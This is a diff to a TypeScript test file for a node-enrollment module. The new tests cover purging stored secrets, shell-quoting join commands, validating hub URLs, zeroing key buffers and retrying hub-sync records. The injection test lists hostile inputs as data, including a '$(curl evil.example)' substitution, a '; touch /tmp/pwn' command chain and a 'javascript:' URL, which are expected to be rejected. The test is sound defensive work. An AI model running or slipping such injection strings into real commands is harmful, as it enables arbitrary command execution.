@@ -26,6 +26,7 @@ import {
   decodeRevokeNodePayload,
   emptyUserKeyState,
   encodeBase64url,
+  encodeJoinToken,
   generateEd25519KeyPair,
   generateKdfParams,
   genesisHead,
@@ -41,19 +42,30 @@ import {
   PENDING_STORAGE_KEY,
   type PendingEnrollment,
   addPendingEnrollment,
+  admitDisposition,
+  admitPlan,
   buildAdmitNodeRecord,
   buildRevokeNodeRecord,
+  classifyKeyLogFailure,
   clearPendingEnrollments,
+  clearUnconfirmedRecords,
   createEnrollmentOnHub,
+  encodeJoinTokenZeroing,
   findPendingForCertificate,
+  forgetUnconfirmedRecord,
+  isTrustedHubUrl,
   joinCommand,
   listPendingEnrollments,
+  listUnconfirmedRecordIds,
   matchPendingCertificate,
   nextPendingExpiry,
   prunePendingEnrollments,
   removePendingEnrollment,
   requireRootPublicKey,
   setPendingStorage,
+  submitAdmitRecord,
+  subscribeUnconfirmedRecords,
+  unconfirmedRecord,
 } from './enrollment';
 import { offerCertificate } from './enrollment-watch';
 import type { HubApi } from './hub-api';
@@ -252,6 +264,79 @@ describe('pending 存储', () => {
     );
     setPendingStorage(storage);
     expect(listPendingEnrollments()).toEqual([]);
+  });
+
+  test('读到旧格式时**立刻把存储里的秘密删掉**，不是只从内存结果里过滤', () => {
+    storage.setItem(
+      PENDING_STORAGE_KEY,
+      JSON.stringify([
+        {
+          hubEnrollmentId: 'legacy',
+          enrollPk: 'pk',
+          enrollSk: 'SECRET-ENROLL-SK',
+          authorizationBytes: 'a',
+          authorizationSig: 's',
+          exp: NOW + 1000,
+          joinToken: 'x'.repeat(128),
+        },
+      ])
+    );
+    setPendingStorage(storage);
+
+    listPendingEnrollments();
+
+    // 同源脚本再也读不到那把私钥
+    expect(storage.dump()[PENDING_STORAGE_KEY]).toBeUndefined();
+    expect(JSON.stringify(storage.dump())).not.toContain('SECRET-ENROLL-SK');
+  });
+
+  test('带秘密味道字段的整条丢弃，其余只以公开投影重写回去', () => {
+    const base = {
+      hubEnrollmentId: 'ok',
+      enrollPk: 'pk',
+      authorizationBytes: 'a',
+      authorizationSig: 's',
+      exp: NOW + 1000,
+      name: null,
+      createdAt: NOW,
+    };
+    storage.setItem(
+      PENDING_STORAGE_KEY,
+      JSON.stringify([
+        { ...base, hubEnrollmentId: 'legacy', joinToken: 'T' },
+        // 将来某个分支塞进来的秘密：名字带 secret/sk/token 一律整条不要
+        { ...base, hubEnrollmentId: 'leaky', sessionSecret: 'LEAK' },
+        // 无害的多余字段：记录留下，但字段不写回去
+        { ...base, note: 'STRIPPED' },
+      ])
+    );
+    setPendingStorage(storage);
+
+    const rows = listPendingEnrollments();
+    expect(rows.map((row) => row.hubEnrollmentId)).toEqual(['ok']);
+
+    const raw = storage.dump()[PENDING_STORAGE_KEY];
+    expect(raw).not.toContain('LEAK');
+    expect(raw).not.toContain('STRIPPED');
+    expect(raw).not.toContain('joinToken');
+    expect(Object.keys(JSON.parse(raw)[0]).sort()).toEqual([
+      'authorizationBytes',
+      'authorizationSig',
+      'createdAt',
+      'enrollPk',
+      'exp',
+      'hubEnrollmentId',
+      'name',
+    ]);
+  });
+
+  test('本来就干净的存储不做无谓重写', async () => {
+    const { pending } = await makeEnrollment();
+    addPendingEnrollment(pending);
+    const before = storage.dump()[PENDING_STORAGE_KEY];
+    setPendingStorage(storage);
+    expect(listPendingEnrollments()).toEqual([pending]);
+    expect(storage.dump()[PENDING_STORAGE_KEY]).toBe(before);
   });
 
   test('同 id 覆盖而不是重复追加，删除后为空', async () => {
@@ -757,11 +842,180 @@ describe('凭据复用窗口', () => {
 describe('joinCommand', () => {
   test('带名称时加 --name，特殊字符加引号', () => {
     expect(joinCommand('https://hub.example', 'TOKEN', 'studio')).toBe(
-      'npx tmex-cli hub join https://hub.example --token TOKEN --name studio'
+      "npx tmex-cli hub join 'https://hub.example' --token TOKEN --name studio"
     );
     expect(joinCommand('https://hub.example', 'TOKEN', 'my node')).toContain("--name 'my node'");
     expect(joinCommand('https://hub.example', 'TOKEN', null)).toBe(
-      'npx tmex-cli hub join https://hub.example --token TOKEN'
+      "npx tmex-cli hub join 'https://hub.example' --token TOKEN"
     );
+  });
+
+  test('URL 一律 shell 转义：合法 URL 里的 & 不会截断命令', () => {
+    const command = joinCommand('https://hub.example/x?a=1&b=2', 'TOKEN');
+    expect(command).toContain("'https://hub.example/x?a=1&b=2'");
+    expect(command).not.toContain('& b');
+    // 引号之外不应再出现裸的 shell 元字符
+    expect(command.split("'")[0]).toBe('npx tmex-cli hub join ');
+  });
+
+  test('注入型 URL 直接拒绝，不是「引起来就算了」', () => {
+    expect(() => joinCommand('https://hub.example; touch /tmp/pwn', 'TOKEN')).toThrow();
+    expect(() => joinCommand('$(curl evil.example)', 'TOKEN')).toThrow();
+    expect(() => joinCommand('http://hub.example', 'TOKEN')).toThrow();
+    expect(() => joinCommand('javascript:alert(1)', 'TOKEN')).toThrow();
+  });
+
+  test('isTrustedHubUrl：只认 https（回环 http 例外），拒绝带凭据的 URL', () => {
+    expect(isTrustedHubUrl('https://hub.example:8443/base')).toBe(true);
+    expect(isTrustedHubUrl('http://localhost:19663')).toBe(true);
+    expect(isTrustedHubUrl('http://127.0.0.1:9663')).toBe(true);
+    expect(isTrustedHubUrl('http://hub.example')).toBe(false);
+    expect(isTrustedHubUrl('https://user:pw@hub.example')).toBe(false);
+    expect(isTrustedHubUrl('ftp://hub.example')).toBe(false);
+    expect(isTrustedHubUrl('')).toBe(false);
+    expect(isTrustedHubUrl(null)).toBe(false);
+  });
+});
+
+describe('encodeJoinTokenZeroing', () => {
+  test('拼出的 96 字节缓冲用完即清零（串本身与共享编码器逐字一致）', () => {
+    const enrollSk = new Uint8Array(32).fill(7);
+    const rootPk = new Uint8Array(32).fill(8);
+    const head = new Uint8Array(32).fill(9);
+    const scratch = new Uint8Array(96).fill(1);
+    const token = encodeJoinTokenZeroing(enrollSk, rootPk, head, scratch);
+
+    expect(token).toBe(encodeJoinToken(enrollSk, rootPk, head));
+    expect(decodeJoinToken(token).enrollSk).toEqual(enrollSk);
+    // 私钥的字节副本不能留在堆里
+    expect(scratch.every((byte) => byte === 0)).toBe(true);
+  });
+
+  test('长度不对直接抛，不产出半截串', () => {
+    expect(() =>
+      encodeJoinTokenZeroing(new Uint8Array(31), new Uint8Array(32), new Uint8Array(32))
+    ).toThrow();
+  });
+});
+
+// ---------------------------------------------------------------------------
+// hub=sync 的失败处理（B2-6）：未确认 = 本地什么都没写，重试必须原样重发同一份字节
+// ---------------------------------------------------------------------------
+
+describe('hub=sync 失败分类', () => {
+  test('超时 / hub 不可达 = 未确认（本地未落库，可原样重试）', () => {
+    expect(classifyKeyLogFailure('HUB_TIMEOUT')).toBe('unconfirmed');
+    expect(classifyKeyLogFailure('unavailable')).toBe('unconfirmed');
+    expect(classifyKeyLogFailure('uplink_down')).toBe('unconfirmed');
+  });
+
+  test('fork / seq_gap = 记录作废（重发同一份永远不会被接受）', () => {
+    expect(classifyKeyLogFailure('KEY_LOG_FORK')).toBe('stale');
+    expect(classifyKeyLogFailure('seq_gap')).toBe('stale');
+  });
+
+  test('其余一律当成记录本身被拒', () => {
+    expect(classifyKeyLogFailure('BAD_SIGNATURE')).toBe('rejected');
+    expect(classifyKeyLogFailure('KEY_LOG_REJECTED')).toBe('rejected');
+  });
+
+  test('只有 hubAck === true 才算确认', () => {
+    expect(admitDisposition({ ok: true, hubAck: true })).toEqual({ kind: 'admitted' });
+    // 旧版 entry 可能仍返回 200 + hubAck:false / 不带该字段
+    expect(admitDisposition({ ok: true, hubAck: false })).toEqual({ kind: 'unconfirmed' });
+    expect(admitDisposition({ ok: true })).toEqual({ kind: 'unconfirmed' });
+    expect(admitDisposition({ ok: false, code: 'HUB_TIMEOUT' })).toEqual({ kind: 'unconfirmed' });
+    expect(admitDisposition({ ok: false, code: 'seq_gap' })).toEqual({ kind: 'stale' });
+    expect(admitDisposition({ ok: false, code: 'BAD_SIGNATURE' })).toEqual({
+      kind: 'error',
+      code: 'BAD_SIGNATURE',
+    });
+  });
+});
+
+describe('submitAdmitRecord', () => {
+  const RECORD = { bytes: 'BYTES-SEQ-6', sig: 'SIG-SEQ-6' };
+
+  function fakeApi(results: ({ ok: true; hubAck?: boolean } | { ok: false; code: string })[]) {
+    const sent: { bytes: string; sig: string }[] = [];
+    return {
+      sent,
+      appendKeyLog(body: { bytes: string; sig: string }, opts?: { hubSync?: boolean }) {
+        expect(opts?.hubSync).toBe(true);
+        sent.push({ ...body });
+        return Promise.resolve(results[sent.length - 1] ?? { ok: true as const, hubAck: true });
+      },
+    };
+  }
+
+  beforeEach(() => clearUnconfirmedRecords());
+
+  test('504 HUB_TIMEOUT：留住记录，重试重发的是**同一份字节**（不重签新 seq）', async () => {
+    const api = fakeApi([
+      { ok: false, code: 'HUB_TIMEOUT' },
+      { ok: true, hubAck: true },
+    ]);
+
+    expect(await submitAdmitRecord(api, 'e-1', RECORD)).toEqual({ kind: 'unconfirmed' });
+    expect(listUnconfirmedRecordIds()).toEqual(['e-1']);
+
+    // 「重试」按钮走的正是这条路径：取暂存记录再发一次
+    const stored = unconfirmedRecord('e-1');
+    expect(stored).toEqual(RECORD);
+    expect(await submitAdmitRecord(api, 'e-1', stored as typeof RECORD)).toEqual({
+      kind: 'admitted',
+    });
+
+    expect(api.sent).toEqual([RECORD, RECORD]);
+    expect(listUnconfirmedRecordIds()).toEqual([]);
+  });
+
+  test('409 hub 拒绝（unavailable）同样保留记录', async () => {
+    const api = fakeApi([{ ok: false, code: 'unavailable' }]);
+    expect(await submitAdmitRecord(api, 'e-2', RECORD)).toEqual({ kind: 'unconfirmed' });
+    expect(unconfirmedRecord('e-2')).toEqual(RECORD);
+  });
+
+  test('fork / seq_gap：暂存记录必须丢掉，否则重试会一直撞同一堵墙', async () => {
+    const api = fakeApi([
+      { ok: false, code: 'HUB_TIMEOUT' },
+      { ok: false, code: 'seq_gap' },
+    ]);
+    await submitAdmitRecord(api, 'e-3', RECORD);
+    expect(unconfirmedRecord('e-3')).toEqual(RECORD);
+
+    expect(await submitAdmitRecord(api, 'e-3', RECORD)).toEqual({ kind: 'stale' });
+    expect(unconfirmedRecord('e-3')).toBeNull();
+    expect(listUnconfirmedRecordIds()).toEqual([]);
+  });
+
+  test('自动路径：手上有未确认记录时一律重发，不再现签（轮询每 5 s 会重来一次）', async () => {
+    const api = fakeApi([{ ok: false, code: 'HUB_TIMEOUT' }]);
+    expect(admitPlan('e-plan', true)).toBe('sign');
+    expect(admitPlan('e-plan', false)).toBe('wait');
+
+    await submitAdmitRecord(api, 'e-plan', RECORD);
+    // 根钥签名者还在复用窗口里，但已经有未确认记录 → 只能重发
+    expect(admitPlan('e-plan', true)).toBe('resend');
+    expect(admitPlan('e-plan', false)).toBe('resend');
+  });
+
+  test('确认成功后不再留着可重发的记录', async () => {
+    const api = fakeApi([{ ok: true, hubAck: true }]);
+    expect(await submitAdmitRecord(api, 'e-4', RECORD)).toEqual({ kind: 'admitted' });
+    expect(unconfirmedRecord('e-4')).toBeNull();
+  });
+
+  test('订阅者能看到未确认集合的变化（页面据此显示「重试」）', async () => {
+    let ticks = 0;
+    const stop = subscribeUnconfirmedRecords(() => {
+      ticks += 1;
+    });
+    await submitAdmitRecord(fakeApi([{ ok: false, code: 'HUB_TIMEOUT' }]), 'e-5', RECORD);
+    expect(ticks).toBe(1);
+    expect(listUnconfirmedRecordIds()).toEqual(['e-5']);
+    forgetUnconfirmedRecord('e-5');
+    expect(ticks).toBe(2);
+    stop();
   });
 });
